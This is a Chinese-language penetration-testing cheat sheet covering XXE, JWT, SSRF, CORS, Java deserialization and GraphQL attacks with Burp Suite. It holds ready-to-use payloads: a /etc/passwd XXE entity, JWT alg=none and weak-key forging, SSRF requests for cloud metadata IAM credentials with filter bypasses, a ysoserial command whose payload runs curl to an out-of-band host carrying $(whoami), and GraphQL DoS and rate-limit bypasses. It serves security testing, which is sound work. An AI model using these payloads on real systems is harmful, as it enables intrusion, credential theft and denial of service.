# 进阶攻击专题：XXE、JWT、SSRF、CORS、反序列化、GraphQL

## 一句话定义
六类高价值漏洞：**XXE** 读文件/打内网、**JWT** 算法/密钥/声明篡改、**SSRF** 让服务端替你访问内网/云元数据、**CORS** 过度放行跨域读数据、**Java 反序列化** 不信任对象还原执行、**GraphQL** 内省泄露/深度嵌套 DoS/字段级越权——都靠 Burp 畸形请求+外带判定验证。

## 核心架构 / 工作原理

```mermaid
graph TD
  A[进阶漏洞六类] --> B[XXE XML 外部实体注入]
  B --> B1[Payload: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">]
  B --> B2[无回显用 Burp Collaborator OOB 验证]
  B --> B3[SVG/Office/SAML 等 XML 格式均可触发]
  
  A --> C[JWT JSON Web Token 攻击]
  C --> C1[alg=none 绕过签名验证]
  C --> C2[HS256 弱密钥爆破 hashcat/jwt_tool]
  C --> C3[RS256 公钥混淆/JWKS 注入/kid 路径遍历]
  C --> C4[关键声明篡改: role/exp/sub/permissions]
  
  A --> D[SSRF 服务端请求伪造]
  D --> D1[参数可控 URL -> 访问内网/169.254.169.254(云元数据)]
  D --> D2[绕过: 重定向/DNS 重绑定/短地址/IPv6/进制 IP]
  D --> D3[验证: Collaborator 收 HTTP/DNS 回调]
  
  A --> E[CORS 跨域资源共享配置错误]
  E --> E1[ACAO 反射任意 Origin + ACAC: true]
  E --> E2[ACAO: * + ACAC: true]
  E --> E3[预检放行敏感 Header/方法]
  
  A --> F[Java 反序列化]
  F --> F1[CommonsCollections/GadgetChain -> ysoserial 生成 Payload]
  F --> F2[RMI/JRMP/LDAP/JNDI 等协议触发]
  F --> F3[无回显靠 Collaborator/DNS/延时判定]
  
  A --> G[GraphQL 攻击面]
  G --> G1[Introspection 开启 -> 拉全 Schema]
  G --> G2[深度嵌套查询 -> DoS/资源耗尽]
  G --> G3[批量查询/别名 -> 绕过限流]
  G --> G4[字段级越权: 查别人 email/ssn 等敏感字段]
```

| 漏洞类型 | 典型入口 | 核心工具/插件 | 验证方式 |
|----------|----------|---------------|----------|
| **XXE** | XML 上传/接口/SAML/Office 文档 | Repeater + Collaborator | 读 `/etc/passwd` 或 OOB HTTP/DNS 回调 |
| **JWT** | Authorization Header / Cookie | **JWT Editor** 插件 | alg=none/弱密钥/声明篡改 → 重签 → Repeater 验证 |
| **SSRF** | URL 参数/导入/回调/Webhook | Repeater + Collaborator | 访问 `http://169.254.169.254/latest/meta-data/` 或内网端口探测 |
| **CORS** | 所有带认证的 API 端点 | Repeater 看响应头 | Origin: evil.com → 看 ACAO/ACAC 是否放行 |
| **反序列化** | Java 应用 Cookie/参数/Session/RMI | **Java Deserialization Scanner** / ysoserial | 生成 Gadget → 发送 → Collaborator/OOB 验证 |
| **GraphQL** | `/graphql` `/api/graphql` | **GraphQL Raider** / InQL | Introspection → 造深度/批量/越权查询 |

## 快速上手步骤

1. **XXE**：
   - 找 XML 入口 → Repeater 发送含外部实体的 XML
   - 无回显：实体引用 `http://<collaborator-id>.oastify.com/` → Collaborator 看回调
   - 绕过：参数实体、DOCTYPE 替换、SVG/Office 文件上传
2. **JWT**：
   - 抓含 JWT 请求 → 右键 Send to JWT Editor
   - **攻击链**：
     - `alg=none` → 删签名段 → 发送
     - HS256 弱密钥 → JWT Editor → Attack → HS256 Bruteforce → 字典跑
     - RS256 公钥混淆 → 导出公钥当 HS256 密钥签
     - 篡改 `role: "admin"` `exp: 9999999999` → 重签
3. **SSRF**：
   - 找 URL 参数(导入、回调、Webhook、PDF 生成、图片加载)
   - 测内网：`http://127.0.0.1:80` `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - 绕过：`http://@internal/ ` `http://localhost:80@evil.com/` `http://2130706433/`(十进制 IP) `http://[::]:80/`
   - Collaborator 验证：`http://<collab-id>.oastify.com/`
4. **CORS**：
   - 遍历 API 端点 → Repeater 加 `Origin: https://evil.com` → 发送
   - 看响应头：`Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` = **高危**
   - `Origin: null` / `Origin: *` / 子域绕过 同测
5. **Java 反序列化**：
   - 识别 Java 应用(报错页/Server 头/Session 格式)
   - 用 ysoserial 生成：`java -jar ysoserial.jar CommonsCollections5 "curl <collab-id>.oastify.com" > payload.bin`
   - Base64 编码放入 Cookie/参数/Body → 发送 → Collaborator 看回调
   - 插件：Java Deserialization Scanner 自动化扫描
6. **GraphQL**：
   - 发 Introspection 查询：`{__schema{types{name fields{name type{name kind ofType}}}}}` → GraphQL Raider 可视化
   - 深度测试：`query{user(id:1){posts{comments{author{posts{comments{...}}}}}}}` 逐层加深直到报错/超时
   - 批量/别名：`query{q1:user(id:1){email} q2:user(id:2){email} ...}` 绕过限流
   - 越权：Introspection 找敏感字段 → 构造查询 → 看是否返回他人数据

```bash
# ysoserial 生成反序列化 Payload
java -jar ysoserial-all.jar CommonsCollections5 "curl http://<collab-id>.oastify.com/$(whoami)" | base64 -w0

# jwt_tool 弱密钥爆破
python3 jwt_tool.py <jwt_token> -d /usr/share/wordlists/rockyou.txt

# GraphQL Introspection
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}' https://target.com/graphql
```

## 踩坑避坑指南

| 场景 | 问题现象 | 原因 | 解决/最佳实践 |
|------|----------|------|---------------|
| XXE 无回显就放弃 | 忽略 OOB 验证 | 解析器不回显实体内容 | **必须用 Collaborator/OAST** 做带外验证 |
| JWT 只测 alg=none | 忽略 HS256 弱密钥/RS256 混淆/kid 注入 | 攻击面窄 | **全链路测**：none → HS256 爆破 → RS256 混淆 → JWKS 注入 → kid 遍历 → 关键声明篡改 |
| SSRF 只测 127.0.0.1 | 忽略云元数据/内网其他段/IPv6/绕过技巧 | 测试面窄 | 必测：`169.254.169.254`(AWS/GCP/Azure) `10.x/172.16-31/192.168` 段扫描、重定向链、DNS 重绑定、IP 进制变形 |
| CORS 只看 ACAO:* | 忽略 ACAO 反射 Origin + ACAC:true 组合 | 误判风险 | **组合判定**：ACAO 反射任意 Origin **且** ACAC:true 才可跨域带 Cookie 读数据 |
| 反序列化只跑一种 Gadget | 目标无该链/版本不匹配 | Gadget 依赖库版本 | 多 Gadget 尝试(CC/CC2/CC5/CC7/ROME/Spring/JSON 等)；用插件自动化探测 |
| GraphQL 只测 Introspection | 忽略 DoS/批量/字段越权 | 只查不攻 | **三件套全测**：Introspection 拿 Schema → 深度/批量造 DoS → 敏感字段越权查询 |

## 替代方案对比

| 维度 | Burp 手测+插件 | 专用工具 | 代码审计/SAST |
|------|----------------|----------|---------------|
| XXE | ✅ Repeater+Collaborator 灵活 | ✅ XXEinjector | ✅ XML 解析器配置审计 |
| JWT | ✅ JWT Editor 一站式 | ✅ jwt_tool/hashcat | ✅ 签名验证逻辑审计 |
| SSRF | ✅ Collaborator OOB 金标准 | ✅ SSRFmap/Gopherus | ✅ URL 校验/允许列表审计 |
| CORS | ✅ Repeater 逐个验证 | ✅ Corsy/CORScanner | ✅ 中间件配置审计 |
| 反序列化 | ⚠️ 需插件/ysoserial 手工 | ✅ Java Deserialization Scanner | ✅ 白名单/安全反序列化审计 |
| GraphQL | ✅ GraphQL Raider/InQL 可视化 | ✅ GraphQL Voyager/Inspector | ✅ Schema/Resolver 权限审计 |
